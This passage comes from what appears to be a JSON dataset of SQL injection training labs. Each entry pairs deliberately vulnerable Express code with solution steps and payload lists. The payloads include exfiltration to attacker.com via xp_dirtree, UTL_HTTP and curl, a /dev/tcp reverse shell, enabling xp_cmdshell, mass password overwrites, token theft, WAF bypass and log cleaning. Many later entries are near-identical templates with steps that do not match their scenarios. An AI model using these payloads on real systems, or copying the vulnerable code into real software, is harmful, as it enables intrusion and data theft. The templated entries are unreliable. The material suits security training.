    "srcCode": "const { ApolloServer } = require('apollo-server');\nconst typeDefs = `\n  directive @sql(raw: Boolean) on FIELD_DEFINITION\n  \n  type Product {\n    id: ID!\n    name: String!\n  }\n  \n  type Query {\n    products(filter: String): [Product] @sql(raw: true)\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    products: (_, { filter }) => {\n      const where = filter ? `WHERE ${filter}` : '';\n      return db.query(`SELECT * FROM products ${where}`);\n    }\n  }\n};\n\nnew ApolloServer({ typeDefs, resolvers }).listen();",
    "payloads": [
      "{ products(filter: \"1=1 UNION SELECT 1,table_name FROM information_schema.tables\") { id name } }",
      "query($filter: String!) { products(filter: $filter) { id } }",
      "{ products(filter: \"name LIKE '%' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--\") { id } }",
      "mutation { __schema { types { name fields { name } } } }"
    ]
  },
  {
    "Lab scenario": "SOAP API SQLi via XML entity injection",
    "Lab Description": "The legacy SOAP service processes XML requests by directly embedding values in SQL queries. The application fails to properly handle XML entities. To solve: combine XXE with SQL injection to extract data via out-of-band techniques.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture SOAP request with Burp",
      "Inject XML entities: <id>&xxe;</id>",
      "Define malicious entity: <!ENTITY xxe \"' OR 1=1--\">",
      "Set up DNS listener for OOB data exfiltration",
      "Use payload: '; DECLARE @q varchar(1024); SET @q = (SELECT password FROM users); EXEC('master..xp_dirtree \"\\\\'+@q+'.attacker.com\\c$\"')--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser-xml');\nconst app = express();\n\nbodyParser.xml(app);\n\napp.post('/soap', (req, res) => {\n  const xml = req.body;\n  const id = xml['soap:Envelope']['soap:Body'][0].GetProduct[0].id[0];\n  \n  // Vulnerable processing\n  const query = `SELECT * FROM products WHERE id = '${id}'`;\n  \n  db.query(query, (err, results) => {\n    // Return SOAP response\n  });\n});",
    "payloads": [
      "<!DOCTYPE test [ <!ENTITY xxe \"' OR 1=1--\"> ]>",
      "<id>' UNION SELECT 1,2,3,LOAD_FILE('/etc/passwd')--</id>",
      "<id>'; EXEC xp_cmdshell('nslookup exfil.attacker.com')--</id>",
      "<id>'||UTL_HTTP.request('attacker.com/'||(SELECT password FROM users WHERE username='admin'))--</id>"
    ]
  },
  {
    "Lab scenario": "Admin panel SQLi in GROUP BY parameter",
    "Lab Description": "The analytics dashboard builds dynamic GROUP BY clauses from user input. The application properly parameterizes WHERE but not GROUP BY. To solve: exploit this to perform a UNION attack retrieving the admin session tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as low-priv user and access analytics",
      "Intercept group parameter with Burp",
      "Test with: group=1 UNION SELECT 1,2,3,4",
      "Determine string columns with: group=1 UNION SELECT 'a','b','c','d'",
      "Extract tokens with: group=1 UNION SELECT 1,session_token,3,4 FROM admin_sessions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\nconst { Pool } = require('pg');\n\nconst pool = new Pool({/* config */});\n\napp.get('/analytics', async (req, res) => {\n  const group = req.query.group || 'day';\n  \n  // Vulnerable GROUP BY\n  const query = `\n    SELECT COUNT(*), ${group} \n    FROM page_views \n    WHERE user_id = $1 \n    GROUP BY ${group}`;\n  \n  try {\n    const result = await pool.query(query, [req.user.id]);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send(err.message); // Error leakage\n  }\n});",
    "payloads": [
      "1 UNION SELECT 1,2,3,4",
      "1 UNION SELECT session_token,null,null,null FROM admin_sessions",
      "1; INSERT INTO admin_sessions VALUES ('hacker','stolen_token')--",
      "1 UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns"
    ]
  },
  {
    "Lab scenario": "Mobile API SQLi via JSON array exploitation",
    "Lab Description": "The mobile API accepts JSON arrays that get expanded directly into IN() clauses. The application fails to properly sanitize array values. To solve: break out of the IN clause to perform a stacked query attack updating all user passwords.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture mobile app API call with Burp",
      "Modify JSON array to: [\"1\") OR 1=1; UPDATE users SET password='hacked'--\"]",
      "Bypass WAF by encoding as Unicode: [\"\\u0031\\u0022\\u0029\\u0020\\u004f\\u0052\\u0020\\u0031\\u003d\\u0031\\u003b\\u0020\\u0055\\u0050\\u0044\\u0041\\u0054\\u0045\"]",
      "Verify password change by logging in as any user",
      "Clean logs with additional stacked query"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.json());\n\napp.post('/api/products', (req, res) => {\n  const ids = req.body.ids; // Expects array like [1,2,3]\n  \n  // Vulnerable IN() construction\n  const query = `SELECT * FROM products WHERE id IN (${ids.map(id => `'${id}'`).join(',')})`;\n  \n  db.query(query, (err, results) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(results);\n  });\n});",
    "payloads": [
      "[\"1\") OR 1=1--\"]",
      "[\"1\"); DROP TABLE logs--\"]",
      "[\"1\" UNION SELECT password FROM users--\"]",
      "[\"1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--\"]"
    ]
  },
  {
    "Lab scenario": "Multi-step SQLi in e-commerce checkout",
    "Lab Description": "The checkout process has multiple SQL injections across different steps. The application uses temporary tables with unsanitized data. To solve: chain these injections to poison the session table and gain admin access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Add item to cart with XSS payload in product name",
      "Proceed to checkout and intercept address update",
      "Inject into address field: '; UPDATE temp_cart SET user_id=1--",
      "Complete payment to trigger temp table processing",
      "Session becomes admin due to poisoned user_id"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/checkout/address', (req, res) => {\n  const { address } = req.body;\n  \n  // First injection\n  db.query(`UPDATE temp_cart SET address = '${address}' WHERE session = '${req.session.id}'`);\n  \n  res.redirect('/checkout/payment');\n});\n\napp.post('/checkout/complete', (req, res) => {\n  // Second injection when processing\n  db.query(`\n    INSERT INTO orders \n    SELECT * FROM temp_cart \n    WHERE session = '${req.session.id}'`);\n  \n  // Vulnerable session update\n  db.query(`\n    UPDATE sessions \n    SET user_id = (SELECT user_id FROM temp_cart WHERE session = '${req.session.id}') \n    WHERE id = '${req.session.id}'`);\n});",
    "payloads": [
      "'; UPDATE temp_cart SET user_id=1--",
      "1'; INSERT INTO temp_cart (session,user_id) VALUES ('hijacked',1)--",
      "'||(SELECT password FROM users WHERE username='admin')||'",
      "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"
    ]
  },
  {
    "Lab scenario": "Banking portal Boolean-based SQL injection in ORDER BY clause",
    "Lab Description": "The application contains a Boolean-based SQL injection vulnerability in the ORDER BY clause, allowing attackers to manipulate SQL queries. The user input is not properly sanitized, allowing crafted queries to bypass controls. To solve: perform a successful injection and extract sensitive information based on the exploitation path.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR '1'='1 -- ",
      "' UNION SELECT null, sqlite_version(), null -- ",
      "' AND 1=IF(1=1,SLEEP(5),0) -- ",
      "' OR EXISTS(SELECT * FROM users WHERE role='admin') -- ",
      "'; EXEC xp_cmdshell('whoami'); --"
    ]
  },
  {
    "Lab scenario": "Time-based SQL injection scenario",
    "Lab Description": "This lab explores a time-based sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 2",
      "' UNION SELECT null, version(), null -- 2",
      "' AND SLEEP(2) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=2) -- ",
      "admin' -- 2"
    ]
  },
  {
    "Lab scenario": "Error-based SQL injection scenario",
    "Lab Description": "This lab explores a error-based sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 3",
      "' UNION SELECT null, version(), null -- 3",
      "' AND SLEEP(3) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=3) -- ",
      "admin' -- 3"
    ]
  },
  {
    "Lab scenario": "Union-based SQL injection scenario",
    "Lab Description": "This lab explores a union-based sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 4",
      "' UNION SELECT null, version(), null -- 4",
      "' AND SLEEP(4) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=4) -- ",
      "admin' -- 4"
    ]
  },
  {
    "Lab scenario": "Blind SQL SQL injection scenario",
    "Lab Description": "This lab explores a blind sql sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 5",
      "' UNION SELECT null, version(), null -- 5",
      "' AND SLEEP(5) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=5) -- ",
      "admin' -- 5"
    ]
  },
  {
    "Lab scenario": "Out-of-band SQL injection scenario",
    "Lab Description": "This lab explores a out-of-band sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 6",
      "' UNION SELECT null, version(), null -- 6",
      "' AND SLEEP(6) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=6) -- ",
      "admin' -- 6"
    ]
  },
  {
    "Lab scenario": "Login Bypass SQL injection scenario",
    "Lab Description": "This lab explores a login bypass sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 7",
      "' UNION SELECT null, version(), null -- 7",
      "' AND SLEEP(7) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=7) -- ",
      "admin' -- 7"
    ]
  },
  {
    "Lab scenario": "Update Injection SQL injection scenario",
    "Lab Description": "This lab explores a update injection sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 8",
      "' UNION SELECT null, version(), null -- 8",
      "' AND SLEEP(8) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=8) -- ",
      "admin' -- 8"
    ]
  },
  {
    "Lab scenario": " Delete Injection SQL injection scenario",
    "Lab Description": "This lab explores a delete injection sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 9",
      "' UNION SELECT null, version(), null -- 9",
      "' AND SLEEP(9) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=9) -- ",
      "admin' -- 9"
    ]
  },
  {
    "Lab scenario": "Join Injection SQL injection scenario",
    "Lab Description": "This lab explores a join injection sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 10",
      "' UNION SELECT null, version(), null -- 10",
      "' AND SLEEP(10) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=10) -- ",
      "admin' -- 10"
    ]
  },
  {
    "Lab scenario": "REST API SQLi through HTTP Headers",
    "Lab Description": "The inventory management API uses the X-User-Id header directly in SQL queries without validation. The application logs all SQL queries for debugging. To solve: perform header injection to extract all API keys from the system_config table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept any API request with Burp Suite",
      "Add malicious X-User-Id header: ' OR 1=1 UNION SELECT 1,config_value,3 FROM system_config WHERE config_name='api_key'--",
      "Bypass WAF by obfuscating with URL encoding",
      "Extract data from verbose error messages",
      "Chain with X-Forwarded-Host header for OOB exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/inventory', (req, res) => {\n  const userId = req.headers['x-user-id'] || '0';\n  const query = `SELECT item_id, item_name FROM inventory WHERE user_id = ${userId}`;\n  \n  console.log(`DEBUG: ${query}`); // Verbose logging\n  \n  db.query(query, (err, results) => {\n    if (err) return res.status(500).json({error: err.message}); // Error leakage\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT 1,@@version--",
      "' OR 1=1; COPY (SELECT * FROM system_config) TO '/var/www/static/leak.csv'--",
      "0' UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
      "1' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT GROUP_CONCAT(config_value) FROM system_config)))--"
    ]
  },
  {
    "Lab scenario": "WebSocket SQLi in real-time chat",
    "Lab Description": "The chat application's WebSocket message handler directly interpolates message metadata into SQL. The vulnerability triggers when editing messages. To solve: exploit this to pivot into the underlying Redis cache and extract session data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebSocket handshake with Burp",
      "Send message edit request with SQLi payload",
      "Use stacked queries to call Redis commands",
      "Dump session keys with: '; EVAL \"return redis.call('keys','sess:*')\" 0--",
      "Extract specific session data using Redis GET"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws) => {\n  ws.on('message', (message) => {\n    const data = JSON.parse(message);\n    \n    if (data.type === 'edit') {\n      // Vulnerable SQL construction\n      db.query(\n        `UPDATE messages SET content = '${data.content}' \n         WHERE id = '${data.msgId}' AND user = '${data.userId}'`\n      );\n    }\n  });\n});",
    "payloads": [
      "' OR 1=1; EVAL \"return redis.call('keys','*')\" 0--",
      "'; EVAL \"return redis.call('get','sess:admin')\" 0--",
      "'||(SELECT system('/bin/sh -i >& /dev/tcp/attacker/443 0>&1'))--",
      "1'; EXECUTE command_executor('curl attacker.com/?leak=$(redis-cli get sess:admin|base64)')--"
    ]
  },
  {
    "Lab scenario": "JWT claim SQLi in analytics dashboard",
    "Lab Description": "The dashboard extracts organization_id from JWT tokens and uses it unsanitized in SQL queries. The application uses PostgreSQL JSON functions. To solve: forge a JWT with malicious JSON path traversal to access all organizations' data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decode JWT using jwt.io",
      "Modify organization_id claim to: ']'::jsonb) OR 1=1--",
      "Use PostgreSQL JSON operators: ' @> '{\"is_admin\":true}'::jsonb--",
      "Extract other organizations' data with path traversal",
      "Access admin panel via JWT claim injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/analytics', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.verify(token, process.env.SECRET);\n  \n  // Vulnerable JSON path usage\n  const query = `\n    SELECT * FROM analytics \n    WHERE org_id::jsonb @> '${decoded.organization_id}'::jsonb`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' @> '{\"is_admin\":true}'::jsonb--",
      "'::jsonb) UNION SELECT 1,2,(SELECT current_setting('session_user'))--",
      "'::jsonb); COPY (SELECT * FROM users) TO PROGRAM 'curl attacker.com/?leak=$(base64 /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "CSV export SQLi with formula injection",
    "Lab Description": "The report generator creates CSV files using direct SQL query results. The application is vulnerable to both SQLi and CSV formula injection. To solve: craft a payload that both extracts database information and triggers RCE when the CSV is opened in Excel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept report generation request",
      "Inject UNION query with CSV formula payload",
      "Use =HYPERLINK() or =WEBSERVICE() formulas",
      "Combine with SQL CONCAT for OOB exfiltration",
      "Trigger malicious formulas when admin opens report"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/export', (req, res) => {\n  const { filters } = req.body;\n  \n  // Vulnerable query construction\n  const query = `\n    SELECT id, name, email \n    FROM users \n    WHERE ${filters} INTO OUTFILE '/tmp/report.csv'`;\n  \n  db.query(query, () => {\n    res.download('/tmp/report.csv');\n  });\n});",
    "payloads": [
      "1=1 UNION SELECT '=HYPERLINK(\"http://attacker.com/leak?\"&A1,A1)',2,3--",
      "1=1 UNION SELECT CONCAT('=WEBSERVICE(\"http://attacker.com/',@@version,'\")'),2,3--",
      "1=1; SELECT * FROM users INTO OUTFILE '/var/www/html/export.csv' FIELDS TERMINATED BY '=CMD|' ENCLOSED BY '\"' LINES TERMINATED BY ' /C calc.exe!'--",
      "1=1 UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/export.csv' LINES TERMINATED BY 0x3d434d447c2f432063616c632e65786521--"
    ]
  },
  {
    "Lab scenario": "SQLi in GraphQL aliases with query batching",
    "Lab Description": "The GraphQL endpoint allows batch queries using aliases that get converted to SQL column names. The application fails to sanitize alias characters. To solve: use specially crafted aliases to perform stacked queries and disable security controls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send GraphQL introspection query",
      "Identify vulnerable mutation with alias support",
      "Craft batch query with malicious aliases: alias1:updateUsers(password:'hacked')",
      "Bypass field restrictions using Unicode aliases",
      "Disable WAF with stacked query injection"
    ],
